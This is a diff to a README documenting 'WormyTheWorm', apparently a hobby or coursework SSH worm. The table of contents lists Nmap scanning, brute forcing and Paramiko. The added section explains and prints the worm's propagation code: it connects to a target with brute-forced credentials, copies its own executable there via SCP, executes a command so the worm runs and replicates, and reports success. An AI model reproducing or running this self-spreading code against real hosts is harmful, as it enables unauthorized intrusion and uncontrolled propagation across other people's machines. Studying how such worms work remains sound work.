@@ -10,8 +10,7 @@ ___
 - NMap 
 - Brute Force 
 - SSH & Paramiko
-- Initializing & Executing Paramiko
-- SCP 
+- Try Except - SSH & SCP via Paramiko
 ___
 ## Dependents 
 &NewLine; 
@@ -106,4 +105,28 @@ The first line of the code below creates a new SSHCLient, and the second line al
 ```sh
 ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()
+```
+## Try Except - SSH & SCP via Paramiko
+
+A "try block" & an "except block" are used to set a timeout limit & an appropriate response, to increase the speed of Wormy as a whole. 
+
+Within the "try block" the following occurs (in order):
+1. ssh.connect is initialized, utlizing the previusly defined username, password, and host variables. The timeout is set at 5 seconds. 
+2. SCP variable is defined intliazed using the SCPClient via a get_transport request. This allows the WormyTheWorm file to be transported to the host machine in preparation for execution & replication. 
+3. An SCP put request that references the first item on the command line (WormyTheWorm executable) is inialized. This step places the file onto to the target machine. 
+4. The previously defined command in executed on the target machine. 
+5. If the above works as it should within the time limit, a message displaying the host IP & "Sucess :)" will be displayed. 
+```sh
+ try:
+        ssh.connect(host, port, username, password, timeout=5)
+        scp = SCPClient(ssh.get_transport())
+        scp.put(sys.argv[0])
+        stdin, stdout, stderr = ssh.exec_command(command)
+        print(host + ' Success :)')
+```
+Within the "except block" the following occurs:
+1. If the "try block" is unsuccessful, a message displaying the host IP & "Timeout :(" will be displayed. 
+```sh
+ except:
+        print(host + ' Timeout :(')
 ```
